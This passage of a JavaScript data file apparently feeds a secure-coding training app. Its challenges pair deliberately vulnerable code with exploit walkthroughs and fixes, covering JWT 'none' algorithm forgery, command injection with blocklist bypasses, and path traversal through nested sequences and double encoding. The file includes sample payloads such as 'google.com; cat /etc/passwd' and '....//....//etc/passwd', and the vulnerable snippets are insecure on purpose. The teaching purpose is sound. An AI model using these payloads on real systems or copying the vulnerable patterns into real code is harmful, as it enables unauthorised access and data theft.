        // Verify signature with secret and allowed algorithms
        const decoded = jwt.verify(token, process.env.JWT_SECRET, {
            algorithms: ['HS256']  // Only allow specific algorithm
        });
        
        if (decoded.role !== 'admin') {
            return res.status(403).json({ error: 'Admin access required' });
        }
        
        const users = db.users.find({});
        res.json(users);
    } catch (err) {
        return res.status(401).json({ error: 'Invalid token' });
    }
});`,
        secureExploitedCode: `// ✅ SAFE: Same attack with modified JWT
app.get('/api/admin/users', (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    // Attacker's token: {"alg":"none"} + {"role":"admin"} + (no sig)
    
    try {
        // jwt.verify() validates signature!
        const decoded = jwt.verify(token, process.env.JWT_SECRET, {
            algorithms: ['HS256']  // Rejects "none" algorithm
        });
        // ✅ Throws JsonWebTokenError: invalid algorithm
        
        if (decoded.role !== 'admin') {
            return res.status(403).json({ error: 'Admin access required' });
        }
        
        const users = db.users.find({});
        res.json(users);
    } catch (err) {
        return res.status(401).json({ error: 'Invalid token' });
        // ✅ Returns 401 - attack blocked!
    }
});`,
        vulnerableLines: [6, 7],
        explanation: 'Using jwt.decode() instead of jwt.verify() allows attackers to modify token claims without detection. The "none" algorithm attack removes signature verification entirely.',
        hints: [
            'What is the difference between jwt.decode() and jwt.verify()?',
            'What happens if you change the algorithm to "none"?',
            'Should you trust claims from an unverified token?'
        ],
        vulnerabilityType: 'Broken Access Control / JWT Manipulation',
        severity: 'critical',
        cwe: 'CWE-639',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'JWT None Algorithm Attack',
            description: 'Modify JWT claims and remove signature',
            payload: `Original: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoidXNlciJ9.signature
Modified: eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.`,
            result: 'Attacker gains admin access without valid credentials'
        }
    },
    {
        id: 'cmdi-basic',
        title: 'Basic Command Injection',
        description: 'Simple command injection through unsanitized user input in shell commands.',
        language: 'python',
        category: 'injection',
        difficulty: 'easy',
        vulnerableCode: `import os

def check_domain(domain):
    # Check if domain is reachable
    result = os.popen(f"nslookup {domain}").read()
    return result`,
        exploitedCode: `import os

def check_domain(domain):
    # 🔴 EXPLOITED: domain = "google.com; cat /etc/passwd"
    result = os.popen(f"nslookup google.com; cat /etc/passwd").read()
    #                                       ↑ Command separator!
    # Shell executes:
    # 1. nslookup google.com
    # 2. cat /etc/passwd
    # ✓ Returns DNS results + password file contents!
    return result`,
        secureCode: `import subprocess
import re

def check_domain(domain):
    # Validate domain format
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.-]+[a-zA-Z0-9]$', domain):
        raise ValueError("Invalid domain format")
    
    # Use subprocess with list arguments (no shell)
    result = subprocess.run(
        ['nslookup', domain],
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout`,
        secureExploitedCode: `import subprocess
import re

def check_domain(domain):
    # domain = "google.com; cat /etc/passwd"
    
    # Regex validation catches the attack
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.-]+[a-zA-Z0-9]$', domain):
        raise ValueError("Invalid domain format")
        # ✅ Raises error - semicolon not allowed!
    
    # Even without validation, list args prevent injection:
    result = subprocess.run(
        ['nslookup', domain],  # domain is ONE argument
        capture_output=True,
        text=True,
        timeout=10
    )
    # Would try: nslookup "google.com; cat /etc/passwd"
    # ✅ Treated as literal domain name, not commands
    return result.stdout`,
        vulnerableLines: [5],
        explanation: 'os.popen() executes commands through the shell, allowing command chaining with ; | && etc. User input should never be interpolated into shell commands.',
        hints: [
            'What shell metacharacters can chain commands?',
            'Does os.popen use a shell?',
            'How can subprocess.run be used safely?'
        ],
        vulnerabilityType: 'OS Command Injection',
        severity: 'critical',
        cwe: 'CWE-78',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Command Chaining',
            description: 'Use semicolon to execute additional commands',
            payload: `domain = "google.com; whoami; id"`,
            result: 'Returns DNS lookup + current user + user ID'
        }
    },
    {
        id: 'cmdi-filter-bypass',
        title: 'Command Injection Filter Bypass',
        description: 'Bypassing weak command injection filters using encoding and alternative syntax.',
        language: 'python',
        category: 'injection',
        difficulty: 'hard',
        vulnerableCode: `import subprocess

def run_diagnostic(target):
    # "Security" filter - block dangerous characters
    blocked = [';', '|', '&', '$', '\`', '>', '<']
    for char in blocked:
        if char in target:
            return "Invalid input"
    
    cmd = f"ping -c 1 {target}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout`,
        exploitedCode: `import subprocess

def run_diagnostic(target):
    # 🔴 EXPLOITED: Attacker uses newline bypass
    # target = "8.8.8.8\\ncat /etc/passwd"
    
    blocked = [';', '|', '&', '$', '\`', '>', '<']
    for char in blocked:
        if char in target:  # Newline not in blocklist!
            return "Invalid input"
    
    # Command becomes:
    # ping -c 1 8.8.8.8
    # cat /etc/passwd
    cmd = f"ping -c 1 {target}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    # ✓ Both commands execute!
    return result.stdout`,
        secureCode: `import subprocess
import shlex

def run_diagnostic(target):
    # Allowlist approach - only permit valid IP/hostname characters
    import re
    if not re.match(r'^[a-zA-Z0-9.-]+$', target):
        return "Invalid input"
    
    # Never use shell=True with user input
    result = subprocess.run(
        ['ping', '-c', '1', target],
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout`,
        secureExploitedCode: `import subprocess
import re

def run_diagnostic(target):
    # target = "8.8.8.8\\ncat /etc/passwd"
    
    # Allowlist validation - only alphanumeric, dots, hyphens
    if not re.match(r'^[a-zA-Z0-9.-]+$', target):
        return "Invalid input"
        # ✅ Newline not in allowlist - blocked!
    
    # Even if it passed, no shell interpretation:
    result = subprocess.run(
        ['ping', '-c', '1', target],  # List args, no shell
        capture_output=True,
        text=True,
        timeout=10
    )
    # ✅ Attack blocked at validation
    return result.stdout`,
        vulnerableLines: [4, 5, 6, 7, 8, 9, 10],
        explanation: 'Blocklist filters are easily bypassed. Newlines, tabs, and encoded characters can inject commands. Always use allowlist validation and avoid shell=True.',
        hints: [
            'What characters are NOT in the blocklist?',
            'Can newlines separate commands in shell?',
            'Why is allowlist better than blocklist?'
        ],
        vulnerabilityType: 'OS Command Injection (Filter Bypass)',
        severity: 'critical',
        cwe: 'CWE-78',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Newline Injection',
            description: 'Bypass blocklist using newline character',
            payload: `target = "8.8.8.8\\nwhoami"
target = "8.8.8.8%0aid"  # URL encoded newline`,
            result: 'Executes ping then whoami/id command'
        }
    },
    {
        id: 'traversal-partial-sanitize',
        title: 'Path Traversal with Partial Sanitization',
        description: 'Incomplete path sanitization that can be bypassed with double encoding or nested sequences.',
        language: 'javascript',
        category: 'traversal',
        difficulty: 'medium',
        vulnerableCode: `const express = require('express');
const path = require('path');
const fs = require('fs');

app.get('/files/:filename', (req, res) => {
    let filename = req.params.filename;
    
    // "Sanitize" by removing ../
    filename = filename.replace('../', '');
    
    const filepath = path.join('/var/app/data', filename);
    
    if (fs.existsSync(filepath)) {
        res.sendFile(filepath);
    } else {
        res.status(404).send('File not found');
    }
});`,
        exploitedCode: `app.get('/files/:filename', (req, res) => {
    // 🔴 EXPLOITED: filename = "....//....//etc/passwd"
    let filename = req.params.filename;
    
    // Only removes first occurrence of ../
    filename = filename.replace('../', '');
    // "....//....//etc/passwd" → "..../....//etc/passwd"
    //                            Still contains ../!
    
    // Or use: "..%2F..%2Fetc/passwd" (URL encoded)
    // Express decodes AFTER this check!
    
    const filepath = path.join('/var/app/data', filename);
    // filepath = "/etc/passwd"
    
    if (fs.existsSync(filepath)) {
        res.sendFile(filepath);  // ✓ Sends /etc/passwd!
    }
});`,
        secureCode: `const express = require('express');
const path = require('path');
const fs = require('fs');

app.get('/files/:filename', (req, res) => {
    const filename = req.params.filename;
    const baseDir = '/var/app/data';
    
    // Resolve to absolute path and normalize
    const filepath = path.resolve(baseDir, filename);
    
    // Verify the resolved path is within allowed directory
    if (!filepath.startsWith(baseDir + path.sep)) {
        return res.status(403).send('Access denied');
    }
    
    if (fs.existsSync(filepath)) {
        res.sendFile(filepath);
    } else {
        res.status(404).send('File not found');
    }
});`,
        secureExploitedCode: `app.get('/files/:filename', (req, res) => {
    // ✅ SAFE: filename = "....//....//etc/passwd"
    const filename = req.params.filename;
    const baseDir = '/var/app/data';
    
    // path.resolve normalizes ALL traversal sequences
    const filepath = path.resolve(baseDir, filename);
    // filepath = "/etc/passwd" (fully resolved)
    
    // Check if resolved path is within allowed directory
    if (!filepath.startsWith(baseDir + path.sep)) {
        return res.status(403).send('Access denied');
        // ✅ "/etc/passwd" doesn't start with "/var/app/data/"
        // ✅ Returns 403!
    }
    
    if (fs.existsSync(filepath)) {
        res.sendFile(filepath);
    }
});`,
        vulnerableLines: [8, 9],
        explanation: 'String.replace() only removes the first occurrence. Attackers use nested sequences (....//), double encoding (%252e%252e/), or mixed encoding to bypass.',
        hints: [
            'Does replace() remove ALL occurrences?',
            'What about ....// or ..././?',
            'When does URL decoding happen?'
        ],
        vulnerabilityType: 'Path Traversal (Filter Bypass)',
        severity: 'high',
        cwe: 'CWE-22',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'Nested Traversal Bypass',
            description: 'Use nested sequences to bypass single replace',
            payload: `....//....//etc/passwd
..././..././etc/passwd
..%2F..%2Fetc/passwd`,
            result: 'After replace: ../etc/passwd - still traverses!'
        }
    },
    {
        id: 'traversal-encoding-bypass',
        title: 'Path Traversal Double Encoding Bypass',
        description: 'Bypassing path traversal filters using double URL encoding.',
        language: 'python',
        category: 'traversal',
        difficulty: 'hard',
        vulnerableCode: `from flask import Flask, request, send_file
from urllib.parse import unquote
import os

app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('file', '')
    
    # Decode URL encoding
    filename = unquote(filename)
    
    # Check for path traversal
    if '..' in filename:
        return "Invalid path", 400
    
    filepath = os.path.join('/var/uploads', filename)
    return send_file(filepath)`,
        exploitedCode: `@app.route('/download')
def download():
    # 🔴 EXPLOITED: file = "%252e%252e%252fetc%252fpasswd"
    # %25 = %, so %252e = %2e (still encoded)
    filename = request.args.get('file', '')
    # filename = "%2e%2e%2fetc%2fpasswd"
    
    # First decode
    filename = unquote(filename)
    # filename = "../etc/passwd" - but wait, Flask already decoded once!
    
    # Actually: Flask decodes %252e → %2e
    # Then unquote decodes %2e → .
    # So: %252e%252e%252f → .. /
    
    if '..' in filename:  # Check happens BEFORE second decode!
        return "Invalid path", 400
    
    # But the filesystem interprets the path...
    filepath = os.path.join('/var/uploads', filename)
    return send_file(filepath)  # ✓ Sends /etc/passwd!`,
        secureCode: `from flask import Flask, request, send_file, abort
import os

app = Flask(__name__)
UPLOAD_DIR = '/var/uploads'

@app.route('/download')
def download():
    filename = request.args.get('file', '')
    
    # Normalize and resolve the full path
    # os.path.realpath resolves symlinks and normalizes
    filepath = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    
    # Verify the resolved path is within allowed directory
    if not filepath.startswith(os.path.realpath(UPLOAD_DIR) + os.sep):
        abort(403)
    
    # Verify file exists
    if not os.path.isfile(filepath):
        abort(404)
    
    return send_file(filepath)`,
        secureExploitedCode: `@app.route('/download')
def download():
    # ✅ SAFE: file = "%252e%252e%252fetc%252fpasswd"
    filename = request.args.get('file', '')
    # After all decoding: "../etc/passwd"
    
    # realpath resolves ALL path components
    filepath = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    # filepath = "/etc/passwd" (fully resolved)
    
    # Check against resolved base directory
    if not filepath.startswith(os.path.realpath(UPLOAD_DIR) + os.sep):
        abort(403)
        # ✅ "/etc/passwd" doesn't start with "/var/uploads/"
        # ✅ Returns 403 Forbidden!
    
    if not os.path.isfile(filepath):
        abort(404)
    
    return send_file(filepath)`,
        vulnerableLines: [11, 12, 13, 14, 15],
        explanation: 'Double encoding (%252e = %2e after first decode = . after second) bypasses filters that check after only one decode. Always validate the final resolved path.',
        hints: [
            'How many times is the input decoded?',
            'What is %25 in URL encoding?',
            'When should path validation happen?'
        ],
        vulnerabilityType: 'Path Traversal (Double Encoding)',
        severity: 'high',
        cwe: 'CWE-22',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'Double URL Encoding',
            description: 'Encode dots and slashes twice to bypass filters',
            payload: `%252e%252e%252f = ../ (double encoded)
%252e = %2e (after 1st decode) = . (after 2nd)
..%c0%af = ../ (overlong UTF-8)`,
            result: 'Bypasses filter, accesses /etc/passwd'
        }
    }
];

export const categories = [
    { id: 'sqli', name: 'SQL Injection', icon: 'Database' },
    { id: 'xss', name: 'XSS', icon: 'Code' },
    { id: 'ssrf', name: 'SSRF', icon: 'Globe' },
    { id: 'idor', name: 'IDOR', icon: 'Key' },
    { id: 'auth', name: 'Authentication', icon: 'Lock' },
    { id: 'crypto', name: 'Cryptography', icon: 'Shield' },
    { id: 'injection', name: 'Command Injection', icon: 'Terminal' },
    { id: 'xxe', name: 'XXE', icon: 'FileCode' },
    { id: 'deserialization', name: 'Deserialization', icon: 'Package' },
    { id: 'redirect', name: 'Open Redirect', icon: 'ExternalLink' },
    { id: 'traversal', name: 'Path Traversal', icon: 'FolderTree' },
    { id: 'rng', name: 'Weak RNG', icon: 'Dices' },
];

export const difficulties = [
    { id: 'easy', name: 'Easy', color: 'green' },
    { id: 'medium', name: 'Medium', color: 'yellow' },
    { id: 'hard', name: 'Hard', color: 'red' },
];
